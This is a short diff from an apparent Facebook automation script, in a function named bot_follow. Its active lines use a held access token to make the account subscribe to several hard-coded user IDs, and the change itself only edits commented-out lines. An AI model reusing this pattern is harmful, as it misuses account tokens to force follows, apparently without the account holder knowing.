@@ -295,8 +295,8 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
 	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Meyy
 	requests.post('https://graph.facebook.com/100027294159255/subscribers?access_token=' + toket) # Asuan Ryo Xyounaa
-#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
-#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
+#	requests.post('https://graph.facebook.com/100001657323379/subscribers?access_token=' + toket) # シ气ララ氕亠亠亠 
+#	requests.post('https://graph.facebook.com//subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
